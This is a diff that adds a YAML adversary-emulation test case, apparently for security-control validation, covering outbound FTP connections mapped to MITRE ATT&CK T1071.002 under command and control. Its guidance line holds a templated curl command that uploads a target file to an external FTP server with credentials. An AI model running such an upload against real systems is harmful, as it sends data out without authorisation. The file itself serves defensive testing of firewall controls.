@@ -1,0 +1,18 @@
+name: Connect outbound over FTP
+description: Establish an outbound connection to a server on the internet over FTP
+platforms:
+prerequisites:
+guidance:
+- shell> curl --ftp-create-dirs -T {{ target_file }} ftp://{{ ftp_user }}:{{ ftp_password }}@{{ ftp_server }}/{{ gen_outfile }}
+block:
+- Outbound connections over FTP are blocked by network security configurations
+detect:
+- ''
+controls:
+- Firewall
+metadata:
+  id: 8a747a24-bcd5-4524-92d5-96064ee880b4
+  tid: T1071.002
+  tactic: TA0011
+  x_vectr_id: 8a747a24-bcd5-4524-92d5-96064ee880b4
+  isv: 1
